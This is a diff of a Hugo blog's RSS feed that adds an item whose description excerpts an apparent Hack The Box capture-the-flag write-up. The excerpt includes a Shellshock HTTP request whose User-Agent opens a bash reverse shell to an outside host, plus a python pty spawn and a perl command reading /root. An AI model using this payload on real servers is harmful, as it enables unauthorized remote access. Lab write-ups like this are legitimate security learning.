@@ -6,7 +6,7 @@
     <description>Recent content on 𝕱 𝕭̣𝖚̣𝖊̇𝖑̣𝖑̇𝖊̇𝖗 🌹</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 11 Mar 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://master.d399a8x098uivu.amplifyapp.com/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 15 Dec 2022 21:45:44 -0800</lastBuildDate><atom:link href="https://master.d399a8x098uivu.amplifyapp.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>[HTB] Nibbles Writeup</title>
       <link>https://master.d399a8x098uivu.amplifyapp.com/posts/nibbles-writeup/</link>
@@ -23,6 +23,15 @@
       
       <guid>https://master.d399a8x098uivu.amplifyapp.com/posts/simple-kernel-driver/</guid>
       <description>Sample article showcasing basic Markdown syntax and formatting for HTML elements.</description>
+    </item>
+    
+    <item>
+      <title>My First Post</title>
+      <link>https://master.d399a8x098uivu.amplifyapp.com/posts/my-first-post/</link>
+      <pubDate>Thu, 15 Dec 2022 21:45:44 -0800</pubDate>
+      
+      <guid>https://master.d399a8x098uivu.amplifyapp.com/posts/my-first-post/</guid>
+      <description>GET /cgi-bin/user.sh HTTP/1.1 Host: 10.10.10.56 User-Agent: () { :; }; echo; echo; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.5/4444 0&amp;gt;&amp;amp;1&amp;#39; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; - ``` perl -e &amp;#39;exec &amp;#34;cat /root&amp;#34;;&amp;#39; ``` Solving start off by doing an nmap scan after doing the nmap scan you should notice there are two ports that are shown to be opened the first port is 80, and the second is 2222 port 80 is http, and is likely hosting a web page port 2222 is hosting ssh which is uncommon after visting the web page, I see that there isnt much on it I will now use dirbuster ( a tool used to bruteforce directories using a wordlist ) after using dirbuster I see that there is a directory for /cgi-bin CGI = (commen gateway interface) This file path is used to host scripts that use enviorment varibles that interact with the web browser after visting the page I can see I get a error 403 which means this page exists but is forbidden I can use dirbuster agian to scan the directories inside ofthe directory /cgi-bin/ in dirbuster I can specify that I want to look for a specific file type in this case I am going to search for script file extensions (example: sh, py, php etc&amp;hellip;) after doing this I have found a user.</description>
     </item>
     
     
